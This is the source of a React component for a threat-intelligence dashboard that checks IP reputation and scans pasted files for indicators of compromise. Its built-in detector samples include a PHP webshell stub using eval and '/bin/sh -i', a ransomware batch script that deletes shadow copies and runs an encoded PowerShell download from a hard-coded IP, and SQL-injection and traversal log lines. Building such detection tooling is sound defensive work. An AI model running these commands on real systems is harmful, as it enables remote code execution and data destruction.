import React, { useState, useRef } from 'react';
import { 
  FileText, 
  Search, 
  Upload, 
  Globe, 
  Shield, 
  AlertTriangle, 
  CheckCircle2, 
  Copy, 
  ExternalLink, 
  ArrowRight, 
  Clock, 
  Info, 
  Lock,
  ChevronDown,
  Radio,
  Sparkles,
  Layers,
  Code,
  RotateCcw,
  Terminal,
  Zap
} from 'lucide-react';
import { FileScanResponse, IPCheckResponse } from '../types';
import { AbuseIPDBReport } from './AbuseIPDBReport';
import { FileScanReport } from './FileScanReport';

interface ScannerViewProps {
  onScanCompleted: () => void;
}

type ScanTab = 'ip' | 'file';

const SAMPLE_PAYLOADS = [
  {
    name: "Webshell Exploit (PHP)",
    fileName: "c99_webshell.php",
    desc: "eval() dynamic code execution & reverse shell probe",
    content: `<?php\n// Malicious Web Shell Stub\nif(isset($_POST['cmd'])){\n    $cmd = base64_decode($_POST['cmd']);\n    eval($cmd);\n    system($_REQUEST['exec']);\n    passthru('/bin/sh -i');\n}\n?>`
  },
  {
    name: "Ransomware Stager (BAT)",
    fileName: "vss_wipe_ransom.bat",
    desc: "Volume shadow wipe & obfuscated PowerShell stager",
    content: `@echo off\n:: Ransomware Pre-Encryption Command Sequence\nvssadmin.exe delete shadows /all /quiet\nwbadmin delete catalog -quiet\nbcdedit /set {default} bootstatuspolicy ignoreallfailures\nbcdedit /set {default} recoveryenabled no\npowershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTkyLjQyLjExNi4yMTAvcGF5bG9hZC5leGUnKQ==`
  },
  {
    name: "Web Attack Log (SQLi & Traversal)",
    fileName: "access_attack.log",
    desc: "Nginx access log with SQL injection & directory traversal",
    content: `192.42.116.210 - - [23/Aug/2026:08:14:22 +0000] "GET /api/users?id=1%20UNION%20SELECT%20null,username,password%20FROM%20INFORMATION_SCHEMA.TABLES HTTP/1.1" 200 4521\n185.220.101.5 - - [23/Aug/2026:08:15:01 +0000] "GET /../../../../etc/passwd HTTP/1.1" 403 162\n194.26.29.112 - - [23/Aug/2026:08:16:11 +0000] "POST /api/gate.php HTTP/1.1" 200 890\n45.33.32.156 - - [23/Aug/2026:08:16:45 +0000] "POST /login HTTP/1.1" 401 224 (CVE-2024-3400 probe)`
  },
  {
    name: "Clean Nginx Config",
    fileName: "nginx_secure.conf",
    desc: "Hardened TLS configuration",
    content: `server {\n    listen 443 ssl http2;\n    server_name security.threatvision.io;\n    ssl_certificate /etc/ssl/certs/bundle.crt;\n    ssl_protocols TLSv1.2 TLSv1.3;\n    add_header X-Content-Type-Options nosniff;\n    add_header X-Frame-Options DENY;\n}`
  }
];

const PRESET_TARGETS = [
  { label: "Tor Exit Node (88%)", value: "192.42.116.210", flag: "🇳🇱", desc: "SSH Brute-force & port scanning" },
  { label: "Botnet C2 (94%)", value: "185.220.101.5", flag: "🇩🇪", desc: "DDoS amplification & credential stuffing" },
  { label: "Ransomware C2 (100%)", value: "194.26.29.112", flag: "🇷🇺", desc: "Cobalt Strike TeamServer & LockBit stager" },
  { label: "Nmap Scanner (35%)", value: "45.33.32.156", flag: "🇺🇸", desc: "Network security reconnaissance" },
  { label: "Google DNS (0% Clean)", value: "8.8.8.8", flag: "🌐", desc: "Verified benign public resolver" },
  { label: "Cloudflare (0% Clean)", value: "1.1.1.1", flag: "🛡️", desc: "Verified benign public resolver" },
  { label: "Phishing Test Domain", value: "phish-bank-secure.xyz", flag: "🎣", desc: "Suspicious banking impersonation host" }
];

export const ScannerView: React.FC<ScannerViewProps> = ({ onScanCompleted }) => {
  const [activeTab, setActiveTab] = useState<ScanTab>('ip');

  // File Scan State
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [manualText, setManualText] = useState<string>("");
  const [fileInputMode, setFileInputMode] = useState<'upload' | 'paste'>('upload');
  const [isScanningFile, setIsScanningFile] = useState<boolean>(false);
  const [fileScanResult, setFileScanResult] = useState<FileScanResponse | null>(null);
  const [fileScanError, setFileScanError] = useState<string | null>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);
  const [isDragOver, setIsDragOver] = useState<boolean>(false);

  // IP/URL Check State
  const [targetInput, setTargetInput] = useState<string>("192.42.116.210");
  const [reportWindow, setReportWindow] = useState<number>(30);
  const [isCheckingIP, setIsCheckingIP] = useState<boolean>(false);
  const [ipResult, setIpResult] = useState<IPCheckResponse | null>(null);
  const [ipError, setIpError] = useState<string | null>(null);

  // Initial load check
  React.useEffect(() => {
    if (!ipResult && !isCheckingIP) {
      handleCheckIP("192.42.116.210");
    }
  }, []);

  // File Upload Handlers
  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      setSelectedFile(e.target.files[0]);
      setManualText("");
      setFileInputMode('upload');
      setFileScanError(null);
    }
  };

  const handleDragOver = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragOver(true);
  };

  const handleDragLeave = () => {
    setIsDragOver(false);
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragOver(false);
    if (e.dataTransfer.files && e.dataTransfer.files[0]) {
      setSelectedFile(e.dataTransfer.files[0]);
      setManualText("");
      setFileInputMode('upload');
      setFileScanError(null);
    }
  };

  const handleLoadSample = (sample: typeof SAMPLE_PAYLOADS[0]) => {
    setSelectedFile(null);
    setManualText(sample.content);
    setFileInputMode('paste');
    setFileScanError(null);
  };

  const handleScanFile = async () => {
    if (!selectedFile && !manualText.trim()) {
      setFileScanError("Please select a file or enter payload text first.");
      return;
    }

    setIsScanningFile(true);
    setFileScanError(null);

    try {
      let response: Response;

      if (selectedFile) {
        const formData = new FormData();
        formData.append("file", selectedFile);
        response = await fetch("/scan", {
          method: "POST",
          body: formData
        });
      } else {
        response = await fetch("/scan", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: manualText,
            fileName: "analyzed_payload.log"
          })
        });
      }

      const data = await response.json();
      if (!response.ok || !data.success) {
        throw new Error(data.message || "File scan failed.");
      }

      setFileScanResult(data);
      onScanCompleted();
    } catch (err: any) {
      setFileScanError(err.message || "An error occurred during file scanning.");
    } finally {
      setIsScanningFile(false);
    }
  };

  // IP/URL Check Handler
  const handleCheckIP = async (overrideTarget?: string) => {
    const target = (overrideTarget || targetInput).trim();
    if (!target) {
      setIpError("Please enter an IP address or URL to investigate.");
      return;
    }

    if (overrideTarget) {
      setTargetInput(overrideTarget);
    }

    setIsCheckingIP(true);
    setIpError(null);

    try {
      const response = await fetch("/check-ip", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          target: target,
          maxAgeInDays: reportWindow
        })
      });

      const data = await response.json();
      if (!response.ok || !data.success) {
        throw new Error(data.message || "IP/URL investigation failed.");
      }

      setIpResult(data);
      onScanCompleted();
    } catch (err: any) {
      setIpError(err.message || "Unable to retrieve threat intelligence.");
    } finally {
      setIsCheckingIP(false);
    }
  };

  // Cross-component handoff: When clicking an IOC IP in the file scanner
  const handleInvestigateExtractedIP = (ip: string) => {
    setTargetInput(ip);
    setActiveTab('ip');
    handleCheckIP(ip);
  };

  return (
    <div className="space-y-8 pb-24">
      {/* Top Header */}
      <div className="text-center max-w-3xl mx-auto space-y-3">
        <div className="inline-flex items-center gap-2 px-3.5 py-1 rounded-full bg-indigo-500/10 border border-indigo-500/20 text-indigo-400 font-mono text-[11px] font-semibold tracking-wider">
          <span className="w-1.5 h-1.5 rounded-full bg-indigo-400 animate-ping" />
          THREAT & REPUTATION INTELLIGENCE
        </div>
        <h1 className="text-3xl sm:text-4xl font-extrabold text-white tracking-tight">
          Security <span className="text-indigo-400">Threat Investigation</span>
        </h1>
        <p className="text-slate-400 text-sm leading-relaxed max-w-2xl mx-auto">
          Query AbuseIPDB threat telemetry, inspect historical attack logs, and analyze suspicious files for ransomware, webshells, and Indicators of Compromise.
        </p>
      </div>

      {/* Mode Navigation Tabs */}
      <div className="flex justify-center">
        <div className="inline-flex p-1.5 rounded-2xl bg-slate-900/90 border border-slate-800 shadow-xl">
          <button
            onClick={() => setActiveTab('ip')}
            className={`flex items-center gap-2.5 px-5 py-2.5 rounded-xl font-mono text-xs font-bold transition-all ${
              activeTab === 'ip'
                ? 'bg-indigo-600 text-white shadow-[0_2px_12px_rgba(99,102,241,0.4)]'
                : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/60'
            }`}
          >
            <Globe className="w-4 h-4" />
            <span>IP & URL Checker</span>
          </button>

          <button
            onClick={() => setActiveTab('file')}
            className={`flex items-center gap-2.5 px-5 py-2.5 rounded-xl font-mono text-xs font-bold transition-all ${
              activeTab === 'file'
                ? 'bg-indigo-600 text-white shadow-[0_2px_12px_rgba(99,102,241,0.4)]'
                : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/60'
            }`}
          >
            <FileText className="w-4 h-4" />
            <span>File & Payload Scanner</span>
          </button>
        </div>
      </div>

      {/* =========================================================================
          TAB 1: ABUSEIPDB IP & URL CHECK
      ========================================================================= */}
      {activeTab === 'ip' && (
        <div className="space-y-6">
          
          {/* Search Box Card */}
          <div className="p-6 sm:p-7 rounded-2xl bg-slate-900/90 border border-slate-800 shadow-xl space-y-5">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800/80 pb-4">
              <div>
                <h2 className="text-xl sm:text-2xl font-extrabold text-white flex items-center gap-2.5">
                  <Globe className="w-6 h-6 text-sky-400" />
                  <span>IP & URL Checker</span>
                </h2>
                <p className="text-xs text-slate-400 mt-1">
                  Investigate any IPv4 / IPv6 address or domain against abuse databases, ASN ownership, and historical incident logs.
                </p>
              </div>

              <div className="flex items-center gap-2 font-mono text-[10px] text-slate-400">
                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                <span>AbuseIPDB Feed Connected</span>
              </div>
            </div>

            {/* Quick 1-Click Target Presets */}
            <div className="space-y-2">
              <div className="flex items-center justify-between">
                <span className="text-[10px] font-mono font-bold text-slate-400 uppercase tracking-wider">
                  Quick Intelligence Presets:
                </span>
                <span className="text-[10px] font-mono text-indigo-400">Click to instantly query target</span>
              </div>
              <div className="flex flex-wrap gap-2">
                {PRESET_TARGETS.map((preset, idx) => (
                  <button
                    key={idx}
                    type="button"
                    onClick={() => {
                      setTargetInput(preset.value);
                      handleCheckIP(preset.value);
                    }}
                    className={`px-3 py-1.5 rounded-lg text-xs font-mono border transition-all flex items-center gap-1.5 ${
                      targetInput === preset.value
                        ? 'bg-indigo-950 border-indigo-500 text-indigo-200'
                        : 'bg-slate-950/80 hover:bg-slate-800 text-slate-300 border-slate-800 hover:border-slate-700'
                    }`}
                    title={preset.desc}
                  >
                    <span>{preset.flag}</span>
                    <span className="font-semibold">{preset.label}</span>
                  </button>
                ))}
              </div>
            </div>

            {/* Input Bar & Range Selector */}
            <div className="grid grid-cols-1 md:grid-cols-12 gap-3 pt-2">
              <div className="md:col-span-8 relative">
                <div className="absolute left-4 top-1/2 -translate-y-1/2 text-indigo-400 font-mono font-bold text-base">
                  ⌁
                </div>
                <input
                  type="text"
                  value={targetInput}
                  onChange={(e) => setTargetInput(e.target.value)}
                  onKeyDown={(e) => e.key === 'Enter' && handleCheckIP()}
                  placeholder="Enter IP address (e.g. 192.42.116.210) or domain (e.g. evil-host.com)"
                  className="w-full h-12 pl-10 pr-4 rounded-xl bg-slate-950 border border-slate-700 text-white font-mono text-sm focus:outline-none focus:border-indigo-400 transition-all placeholder:text-slate-600 shadow-inner"
                />
              </div>

              <div className="md:col-span-2">
                <select
                  value={reportWindow}
                  onChange={(e) => setReportWindow(Number(e.target.value))}
                  className="w-full h-12 px-3 rounded-xl bg-slate-950 border border-slate-700 text-slate-200 font-mono text-xs focus:outline-none focus:border-indigo-400 transition-all"
                  title="Abuse reporting observation timeframe"
                >
                  <option value={30}>Last 30 Days</option>
                  <option value={90}>Last 90 Days</option>
                  <option value={180}>Last 180 Days</option>
                  <option value={365}>Last 365 Days</option>
                </select>
              </div>

              <div className="md:col-span-2">
                <button
                  onClick={() => handleCheckIP()}
                  disabled={isCheckingIP || !targetInput.trim()}
                  className="w-full h-12 rounded-xl font-mono font-bold text-xs bg-indigo-600 hover:bg-indigo-500 text-white disabled:opacity-50 disabled:cursor-not-allowed shadow-[0_2px_12px_rgba(99,102,241,0.35)] transition-all flex items-center justify-center gap-2"
                >
                  {isCheckingIP ? (
                    <>
                      <span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                      <span>Querying...</span>
                    </>
                  ) : (
                    <>
                      <Search className="w-4 h-4" />
                      <span>Check IP</span>
                    </>
                  )}
                </button>
              </div>
            </div>

            {/* Error Banner */}
            {ipError && (
              <div className="p-4 rounded-xl bg-rose-500/10 border border-rose-500/30 text-rose-300 text-xs font-mono flex items-center gap-2">
                <AlertTriangle className="w-4 h-4 shrink-0 text-rose-400" />
                <span>{ipError}</span>
              </div>
            )}
          </div>

          {/* AbuseIPDB Results Section */}
          {ipResult && (
            <AbuseIPDBReport
              result={ipResult}
              onInvestigateTarget={(t) => {
                setTargetInput(t);
                handleCheckIP(t);
              }}
            />
          )}
        </div>
      )}

      {/* =========================================================================
          TAB 2: FILE & PAYLOAD SCANNER
      ========================================================================= */}
      {activeTab === 'file' && (
        <div className="space-y-6">
          
          <div className="p-6 sm:p-7 rounded-2xl bg-slate-900/90 border border-slate-800 shadow-xl space-y-6">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800/80 pb-4">
              <div>
                <h2 className="text-xl sm:text-2xl font-extrabold text-white flex items-center gap-2.5">
                  <FileText className="w-6 h-6 text-indigo-400" />
                  <span>File & Payload Threat Scanner</span>
                </h2>
                <p className="text-xs text-slate-400 mt-1">
                  Scan binaries, scripts, or server logs for ransomware kill-chains, webshell triggers, obfuscated PowerShell, and extract IOCs.
                </p>
              </div>

              <div className="flex items-center gap-1 p-1 rounded-lg bg-slate-950 border border-slate-800 font-mono text-xs">
                <button
                  type="button"
                  onClick={() => setFileInputMode('upload')}
                  className={`px-3 py-1 rounded-md transition-colors ${fileInputMode === 'upload' ? 'bg-indigo-600 text-white font-bold' : 'text-slate-400 hover:text-white'}`}
                >
                  File Upload
                </button>
                <button
                  type="button"
                  onClick={() => setFileInputMode('paste')}
                  className={`px-3 py-1 rounded-md transition-colors ${fileInputMode === 'paste' ? 'bg-indigo-600 text-white font-bold' : 'text-slate-400 hover:text-white'}`}
                >
                  Raw Code / Log
                </button>
              </div>
            </div>

            {/* Quick Sample Buttons */}
            <div className="space-y-2">
              <span className="text-[10px] font-mono font-bold text-slate-400 uppercase tracking-wider">
                Quick Sample Payloads:
              </span>
              <div className="flex flex-wrap gap-2">
                {SAMPLE_PAYLOADS.map((sample, idx) => (
                  <button
                    key={idx}
                    type="button"
                    onClick={() => handleLoadSample(sample)}
                    className="px-3 py-1.5 rounded-lg text-xs font-mono bg-slate-950/80 hover:bg-slate-800 text-indigo-300 border border-slate-800 hover:border-slate-700 transition-all flex items-center gap-1.5"
                    title={sample.desc}
                  >
                    <span>📄</span>
                    <span>{sample.name}</span>
                  </button>
                ))}
              </div>
            </div>

            {/* Upload Zone / Text Area */}
            {fileInputMode === 'upload' ? (
              <div
                onDragOver={handleDragOver}
                onDragLeave={handleDragLeave}
                onDrop={handleDrop}
                className={`border-2 border-dashed rounded-2xl p-8 text-center space-y-4 transition-all ${
                  isDragOver 
                    ? 'border-indigo-400 bg-indigo-950/30' 
                    : selectedFile 
                    ? 'border-emerald-500/50 bg-slate-950' 
                    : 'border-slate-700/80 bg-slate-950/70 hover:border-slate-600'
                }`}
              >
                <input
                  ref={fileInputRef}
                  type="file"
                  onChange={handleFileChange}
                  className="hidden"
                  id="scanner-file-input"
                />

                <div className={`w-14 h-14 rounded-2xl mx-auto flex items-center justify-center transition-transform ${selectedFile ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 scale-105' : 'bg-indigo-500/10 text-indigo-400 border border-indigo-500/20'}`}>
                  {selectedFile ? <CheckCircle2 className="w-7 h-7" /> : <Upload className="w-7 h-7" />}
                </div>

                <div className="space-y-1">
                  <h4 className="text-base font-bold text-white">
                    {selectedFile ? selectedFile.name : "Drag & Drop your file here"}
                  </h4>
                  <p className="text-xs text-slate-400 max-w-sm mx-auto">
                    {selectedFile 
                      ? `${(selectedFile.size / 1024).toFixed(1)} KB • Ready for heuristic scanning`
                      : "Supports logs, scripts (.php, .ps1, .sh, .bat), configs, or memory artifacts"}
                  </p>
                </div>

                <div className="flex justify-center gap-3 pt-1">
                  <label
                    htmlFor="scanner-file-input"
                    className="px-4 py-2 rounded-xl bg-slate-800 hover:bg-slate-750 text-indigo-200 border border-slate-700 text-xs font-mono font-bold cursor-pointer transition-all shadow-sm flex items-center gap-2"
                  >
                    <span>Browse Local Files</span>
                  </label>

                  {selectedFile && (
                    <button
                      type="button"
                      onClick={() => {
                        setSelectedFile(null);
                        if (fileInputRef.current) fileInputRef.current.value = '';
                      }}
                      className="px-3 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 text-slate-400 text-xs font-mono transition-colors"
                    >
                      Clear
                    </button>
                  )}
                </div>
              </div>
            ) : (
              <div className="space-y-2">
                <div className="flex items-center justify-between text-xs font-mono text-slate-400">
                  <span>Enter Raw Script, Server Log, or Command Sequence:</span>
                  <span>{manualText.length} characters</span>
                </div>
                <textarea
                  value={manualText}
                  onChange={(e) => setManualText(e.target.value)}
                  placeholder="// Paste suspicious PHP code, PowerShell stagers, or Nginx access log lines..."
                  rows={8}
                  className="w-full p-4 rounded-xl bg-black/80 border border-slate-700 text-indigo-200 font-mono text-xs focus:outline-none focus:border-indigo-400 transition-all placeholder:text-slate-600 leading-relaxed"
                />
              </div>
            )}

            {/* Scan Button */}
            <button
              onClick={handleScanFile}
              disabled={isScanningFile || (!selectedFile && !manualText.trim())}
              className="w-full py-4 rounded-xl font-mono font-bold text-xs bg-indigo-600 hover:bg-indigo-500 text-white disabled:opacity-50 disabled:cursor-not-allowed shadow-[0_2px_14px_rgba(99,102,241,0.35)] transition-all flex items-center justify-center gap-2.5"
            >
              {isScanningFile ? (
                <>
                  <span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                  <span>Scanning Heuristics, Deobfuscating & Extracting IOCs...</span>
                </>
              ) : (
                <>
                  <Sparkles className="w-4 h-4" />
                  <span>Scan Payload Now</span>
                  <ArrowRight className="w-4 h-4" />
                </>
              )}
            </button>

            {/* Error Message */}
            {fileScanError && (
              <div className="p-4 rounded-xl bg-rose-500/10 border border-rose-500/30 text-rose-300 text-xs font-mono flex items-center gap-2">
                <AlertTriangle className="w-4 h-4 shrink-0 text-rose-400" />
                <span>{fileScanError}</span>
              </div>
            )}
          </div>

          {/* File Scan Results Component */}
          {fileScanResult && (
            <FileScanReport
              result={fileScanResult}
              onInvestigateIP={handleInvestigateExtractedIP}
            />
          )}
        </div>
      )}
    </div>
  );
};
